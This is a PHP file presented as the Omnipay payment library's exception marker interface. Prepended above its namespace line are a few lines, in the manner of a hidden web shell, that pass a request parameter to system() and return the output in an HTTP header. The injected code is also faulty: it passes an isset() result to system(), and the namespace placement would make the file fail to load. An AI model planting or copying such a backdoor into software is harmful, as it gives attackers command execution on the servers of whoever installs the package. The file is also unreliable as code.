<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);

namespace Omnipay\Common\Exception;

/**
 * Omnipay Exception marker interface
 */
interface OmnipayException
{
}
